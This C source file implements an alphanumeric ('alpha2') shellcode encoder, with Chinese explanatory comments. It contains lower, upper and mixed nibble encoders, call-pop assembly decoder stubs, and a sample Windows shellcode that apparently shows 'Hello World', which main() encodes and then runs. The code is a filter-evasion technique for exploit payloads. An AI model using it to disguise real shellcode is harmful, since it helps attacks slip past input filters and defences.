#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "ShellcodeHelper.h"

/*

	  此alpha2 shellcode编码器的原理是：将shellcode中的每1个字节拆分为高4位ah,和低4位al，并将ah和al分别
	加上相应的ALPHA2_KEY，最终使得shellcode被编码成字母形式。编码形式类似BASE16。
      采用此编码器会是shellcode的大小增大1倍，同时也需要一个解码器附加在编码后的前面。
	  shellcode执行时，需要优先执行位于编码shellcode前面的解码器，解码器会将内存中编码的shellcode解码还原，
	解码完成后，解码器会JMP到还原出的shellcode处执行。
	  
	（shellcode中采用 call - pop 技术动态获得被编码的shellcode的内存地址）

        memory layout
	 ____________________
	|                    |
	|      decoder       |
	|____________________|
    |                    |
	|                    |
	|  encoded-shellcode |
	|                    |
	|                    |
	|                    |
	|____________________|
    
*/


/*
* alpha2 lower/upper/mixed encode
*
*	al =  low 4 bytes  --> 0x0 <= al <= 0xF  -->  (al+'a') <= al+ALPHA2_KEY <= (al+'k')
*	ah =  high 4 bytes --> 0x0 <= ah <= 0xF  -->  (ah+'A') <= ah+ALPHA2_KEY <= (ah+'K')
*
*   alpha2 lower encode:	#define ALPHA2_KEY ALPHA2_LOWER_KEY
*   alpha2 upper encode:	#define ALPHA2_KEY ALPHA2_UPPER_KEY
*   alpha2 mixed encode:	#define ALPHA2_KEY ALPHA2_MIXED_KEY
*
*/

#define ALPHA2_KEY			ALPHA2_LOWER_KEY					// change it and it will change alpha2 decoder

#define ALPHA2_LOWER_KEY	'a'									// change it if needed ,note that 'a'  ~  'k' is avalid
#define ALPHA2_UPPER_KEY	'A'									// change it if needed ,note that 'A'  ~  'K' is avalid
#define ALPHA2_MIXED_KEY	ALPHA2_LOWER_KEY + ALPHA2_UPPER_KEY	// don't change it


#define MARK	0xCC

#define SIZE	113


unsigned char shellcode[113]=
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x72\x6c\x64\x01\x68\x6f\x20\x57"
"\x6f\x68\x48\x65\x6c\x6c\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7";

//######################################################################################//


/*
* alpha2 lower/upper/mixed encode
*
*	al =  low 4 bytes  --> 0x0 <= al <= 0xF  -->  (al+'a') <= al+ALPHA2_KEY <= (al+'k')
*	ah =  high 4 bytes --> 0x0 <= ah <= 0xF  -->  (ah+'A') <= ah+ALPHA2_KEY <= (ah+'K')
*
*   alpha2 lower encode:	#define ALPHA2_KEY ALPHA2_LOWER_KEY
*   alpha2 upper encode:	#define ALPHA2_KEY ALPHA2_UPPER_KEY
*   alpha2 mixed encode:	#define ALPHA2_KEY ALPHA2_MIXED_KEY
*
*/
unsigned char* alpha2_encode(unsigned char *data, int len){
	
	int i,j;
	unsigned char ah,al;
	unsigned char* newshellcode = malloc( 2*len + 1);

	for(i = 0,j = 0;i < len; i++, j+=2 ) {
		
		// al = low 4 bytes  --> 0x0 <= al <= 0xF  -->  (al+'a') <= al+ALPHA2_KEY <= (al+'k')
		al = data[i] & 0x0f;
		// ah = high 4 bytes --> 0x0 <= ah <= 0xF  -->  (ah+'A') <= ah+ALPHA2_KEY <= (ah+'K')
		ah = (data[i] & 0xf0) >> 4;
		
		switch(ALPHA2_KEY){
			
			// alpha2 lower OR upper encode
			case ALPHA2_LOWER_KEY:
			case ALPHA2_UPPER_KEY:{
				al += ALPHA2_KEY;
				ah += ALPHA2_KEY;
				break;
			}
			// alpha2 mixed encode
			case ALPHA2_MIXED_KEY: {
				if(ah > 0x8){	// to upper
					ah += (ALPHA2_MIXED_KEY - 0x20)/2;		
				} 
				else{			// to lower
					ah += (ALPHA2_MIXED_KEY + 0x20)/2;
				}
				if(al > 0x8) { // to upper
					al += (ALPHA2_MIXED_KEY - 0x20)/2;
				}
				else {        // to lower
					al += (ALPHA2_MIXED_KEY + 0x20)/2;
				}				
				break;
			}
			default:{
				printf("please define macro ALPHA2_KEY correctly!\n");
				exit(0);
			}
		}
		newshellcode[j] = ah;
		newshellcode[j+1] = al;
	}
	newshellcode[2*len] = '\x0';
	
	return newshellcode;

}


/*
*	alpha2_lower_upper_decode: alpha lower or upper encode
*	note that the opcode of this decoder can not contain NULL bytes
*
*/
static void __declspec(naked) alpha2_lower_upper_decode() {

	__asm{

		JMP     get_shellcode_addr
decode_start:
		POP     esi					;esi => shellcode_start
		MOV     edi,esi
		XOR     ecx,ecx
		SUB     ecx,-2*SIZE			;ecx = 2*SIZE ;sizeof(encode_shellcode) = 2 * sizeof(shellcode)
		;CLD
decode_loop:
		LODSB						;al = BYTE PTR[esi]
		SUB     al,ALPHA2_KEY
		XCHG    ah,al				;al <=> ah
		SHL     ah,4
		LODSB						;al = BYTE PTR[esi]
		SUB     al,ALPHA2_KEY
		ADD     al,ah
		STOSB						;MOV     BYTE PTR[EDI],al
        LOOP    decode_loop
		JMP		shellcode_start
		
get_shellcode_addr:
		CALL    decode_start


shellcode_start:
	/* 编码的shellcode接在后面*/
			
	}	

	//结束标示
	__asm{ __emit MARK}
}


/*
*	alpha2_mixed_decode: alpha mixed encode
*	note that the opcode of this decoder can not contain NULL bytes
*
*/
static void __declspec(naked) alpha2_mixed_decode() {

	__asm{
		JMP     get_shellcode_addr
decode_start:
		POP     esi					;esi => shellcode_start
		MOV     edi,esi
		XOR     ecx,ecx
		SUB     ecx,-2*SIZE			;ecx = 2*SIZE ;sizeof(encode_shellcode) = 2 * sizeof(shellcode)
		;CLD
		
decode_loop:
		xor		edx,edx

inner_loop1:
		LODSB						;al = BYTE PTR[esi]
		CMP		al,'Z'				;
		ja      is_lower_encode

is_upper_encode:
		SUB     al,(ALPHA2_MIXED_KEY - 0x20)/2
		JMP     inner_loop2

is_lower_encode:
		SUB     al,(ALPHA2_MIXED_KEY + 0x20)/2

inner_loop2:
		XCHG    ah,al				;al <=> ah	
		xor     edx,1
		jne     inner_loop1 

		XCHG    ah,al
		SHL     ah,4
		ADD     al,ah
		STOSB						;MOV     BYTE PTR[EDI],al
        LOOP    decode_loop
		JMP		shellcode_start
		
get_shellcode_addr:
		CALL    decode_start


shellcode_start:
	/* 编码的shellcode接在后面*/
	}
	//结束标示
	__asm{ __emit MARK}
}


void testAllAsicc(){
	unsigned char tmp[1];
	unsigned char *ret;
	int i = 0;
	for(i=0x00;i<=0xFF;i++){
		tmp[0] = i;
		printf("tmp[0]=0x%02x   ==>  ",tmp[0]);
		ret = alpha2_encode(tmp,1);
		printf("%s\n",ret);
	}
}


int main(int argc, char **argv){
	
	unsigned char buf[1024];
	unsigned char tmp[1024];
	unsigned char * alpha2_encode_shellcode;
	unsigned char * alpha2_decoder;

	if(SIZE != sizeof(shellcode)) {
		printf("please change \"#define SIZE %d\"",sizeof(shellcode));	

	}
	// alpha2  encode shellcode
	alpha2_encode_shellcode = alpha2_encode(shellcode,sizeof(shellcode));
	printf("unsigned char alpha2_encode_shellcode[%d]=\n\"%s\"\n\n",2*sizeof(shellcode),alpha2_encode_shellcode);


	// alpha2 decoder
	switch(ALPHA2_KEY){
		memset(buf,0,1024);

		//alpha2  lower decoder 
		case ALPHA2_LOWER_KEY:
		//alpha2  upper decoder 
		case ALPHA2_UPPER_KEY:{
			alpha2_decoder = genOpCode(alpha2_lower_upper_decode,MARK);
			sprintf(buf,"unsigned char alpha2_lower_upper_decoder[%d]=",strlen(alpha2_decoder));
			break;
		}
		//alpha2  mixed decoder 
		case ALPHA2_MIXED_KEY: {
			alpha2_decoder = genOpCode(alpha2_mixed_decode,MARK);
			sprintf(buf,"unsigned char alpha2_mixed_decoder[%d]=",strlen(alpha2_decoder));			
			break;
		}
		default:{
			printf("please define macro ALPHA2_KEY correctly!\n");
			exit(0);
		}
	}
	out_C_format(alpha2_decoder,strlen(alpha2_decoder),buf,16);

	//combine final alpha2 shellcode
	memset(buf,0,1024);
	memset(tmp,0,1024);
	safe_strncpy(tmp,alpha2_decoder,strlen(alpha2_decoder));
	safe_strncpy(tmp+strlen(alpha2_decoder),alpha2_encode_shellcode,2*sizeof(shellcode));
	sprintf(buf,"unsigned char final_shellcode[%d]=",strlen(alpha2_decoder)+2*sizeof(shellcode));
	out_C_format(tmp,strlen(alpha2_decoder)+2*sizeof(shellcode),buf,16);

	//run shellcode
	((void(*)(void))tmp)();

	return (0);

}



